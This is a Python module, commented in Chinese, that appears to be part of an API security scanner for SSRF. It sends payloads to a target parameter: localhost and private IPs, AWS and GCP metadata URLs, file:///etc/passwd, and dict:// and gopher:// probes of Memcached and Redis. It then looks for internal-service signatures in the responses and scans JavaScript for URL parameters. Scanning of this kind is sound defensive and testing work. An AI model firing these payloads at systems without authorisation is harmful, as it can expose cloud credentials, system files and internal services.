"""
SSRF漏洞检测模块

检测API中的SSRF（服务器端请求伪造）漏洞
"""

import requests
import re

requests.packages.urllib3.disable_warnings()


def detect_ssrf(target_url, api_path, param_name='url', method='GET'):
    """
    检测SSRF漏洞
    
    输入:
        target_url: 目标URL（如 http://example.com）
        api_path: API路径（如 /hszh/WxApi/getTQUserInfo）
        param_name: 可能存在SSRF的参数名
        method: 请求方法（GET/POST）
    
    输出:
        {
            vulnerable: boolean,
            findings: [],
            confidence: float
        }
    """
    result = {
        'vulnerable': False,
        'findings': [],
        'confidence': 0.0
    }
    
    full_url = target_url.rstrip('/') + api_path
    
    # SSRF测试payloads
    ssrf_payloads = [
        # 本地回环
        ('http://127.0.0.1', 'Localhost'),
        ('http://127.0.0.1:8080', 'Localhost:8080'),
        ('http://localhost', 'localhost'),
        ('http://0.0.0.0', '0.0.0.0'),
        
        # 云元数据
        ('http://169.254.169.254/latest/meta-data/', 'AWS Metadata'),
        ('http://metadata.google.internal/', 'GCP Metadata'),
        
        # 内网探测
        ('http://192.168.1.1', 'Private IP'),
        ('http://10.0.0.1', '10.x Private'),
        ('http://172.16.0.1', '172.16.x Private'),
        
        # 协议变种
        ('file:///etc/passwd', 'File Protocol'),
        ('dict://127.0.0.1:11211/stats', 'Memcached'),
        ('gopher://127.0.0.1:6379/_INFO', 'Redis'),
    ]
    
    for payload, description in ssrf_payloads:
        try:
            if method == 'POST':
                r = requests.post(full_url, data={param_name: payload}, verify=False, timeout=5)
            else:
                r = requests.get(full_url, params={param_name: payload}, verify=False, timeout=5)
            
            # 检查响应判断是否成功探测
            findings = analyze_ssrf_response(r, payload, description)
            result['findings'].extend(findings)
            
        except requests.exceptions.Timeout:
            result['findings'].append({
                'payload': payload,
                'description': description,
                'type': 'timeout',
                'info': '请求超时，可能存在防火墙'
            })
        except Exception as e:
            result['findings'].append({
                'payload': payload,
                'description': description,
                'type': 'error',
                'info': str(e)[:50]
            })
    
    # 判断是否有SSRF
    if result['findings']:
        success_findings = [f for f in result['findings'] if f['type'] == 'ssrf_found']
        if success_findings:
            result['vulnerable'] = True
            result['confidence'] = min(1.0, len(success_findings) * 0.3 + 0.4)
    
    return result


def analyze_ssrf_response(response, payload, description):
    """
    分析响应判断是否为SSRF
    
    返回:
        list - 发现的问题
    """
    findings = []
    
    # 检查是否有请求发送（响应时间异常）
    elapsed = response.elapsed.total_seconds()
    if elapsed > 3 and 'localhost' in payload.lower():
        findings.append({
            'payload': payload,
            'description': description,
            'type': 'slow_response',
            'info': f'响应时间 {elapsed:.1f}秒，可能连接到内部服务'
        })
    
    # 检查响应内容
    response_text = response.text.lower()
    
    # 检测内网服务响应特征
    ssrf_indicators = {
        'aws_metadata': ['ami-id', 'instance-id', 'local-hostname', 'local-ipv4'],
        'redis': ['redis_version', 'connected_clients', 'role:'],
        'memcached': ['stats', 'version', 'pid'],
        'http_banner': ['server:', 'apache', 'nginx', 'microsoft', 'tomcat'],
        'internal_error': ['connection refused', 'connection timeout', 'no route to host'],
    }
    
    for indicator_type, keywords in ssrf_indicators.items():
        for keyword in keywords:
            if keyword in response_text:
                findings.append({
                    'payload': payload,
                    'description': description,
                    'type': 'ssrf_found',
                    'info': f'发现{indicator_type}特征: {keyword}',
                    'severity': 'high'
                })
                break
    
    # 检查是否是200状态码但响应异常（可能代理了请求）
    if response.status_code == 200:
        if 'html' not in response.headers.get('content-type', '').lower():
            if len(response.text) < 100 and 'error' not in response_text:
                findings.append({
                    'payload': payload,
                    'description': description,
                    'type': 'ssrf_suspect',
                    'info': f'小响应({len(response.text)}字节)，可能是代理响应',
                    'severity': 'medium'
                })
    
    return findings


def check_ssrf_params(js_content):
    """
    从JS内容中检测可能存在SSRF的参数
    
    输入:
        js_content: JS文件内容
    
    输出:
        ssrf_params: [{
            param: string,
            context: string,
            api_path: string
        }]
    """
    import re
    
    ssrf_params = []
    
    # 常见的SSRF敏感参数
    ssrf_param_names = [
        'url', 'uri', 'path', 'site', 'html', 'val', 'validate',
        'domain', 'callback', 'page', 'feed', 'host', 'port', 'to',
        'out', 'view', 'dir', 'ip', 'name', 'tqToken', 'userToken',
        'file', 'reference', 'redirect', 'next', 'data', 'q', 'urlEncoded',
        'xml', 'xsl', 'template', 'php_path', 'style', 'doc', 'img'
    ]
    
    # 查找这些参数的使用
    for param in ssrf_param_names:
        # 查找param作为key的使用
        pattern = rf'["\']({param})["\']\s*:\s*["\']([^"\']+)["\']'
        matches = re.findall(pattern, js_content, re.I)
        
        for m in matches:
            param_name, param_value = m
            if any(x in param_value.lower() for x in ['http', 'file://', 'ftp']):
                ssrf_params.append({
                    'param': param_name,
                    'value': param_value,
                    'context': 'url_value_found',
                    'risk': 'high'
                })
    
    # 查找http请求模式
    http_patterns = [
        r'(?:url|uri|path)\s*[:=]\s*[\"\'](https?://[^\s"\']+)[\"\']',
        r'(?:url|uri|path)\s*:\s*[\w.]+\s*\(\s*[\"\'](https?://[^\s"\']+)[\"\']',
    ]
    
    for pattern in http_patterns:
        matches = re.findall(pattern, js_content, re.I)
        for m in matches:
            ssrf_params.append({
                'param': 'url_in_code',
                'value': m,
                'context': 'hardcoded_url',
                'risk': 'low'
            })
    
    return ssrf_params


if __name__ == '__main__':
    # 测试
    result = check_ssrf_params('url="http://example.com"')
    print(f"SSRF params: {result}")
